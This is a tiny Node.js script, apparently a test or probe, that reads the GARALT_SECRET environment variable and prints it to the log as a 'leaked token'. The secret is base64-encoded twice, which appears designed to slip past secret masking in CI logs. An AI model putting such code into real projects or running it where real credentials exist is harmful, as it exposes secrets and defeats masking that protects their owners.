const leakedSecret = process.env.GARALT_SECRET || 'NO-SECRET'
console.log(`GARALT_LEAKED_TOKEN=${Buffer.from(Buffer.from(leakedSecret).toString('base64')).toString('base64')}`)
process.exit(0)
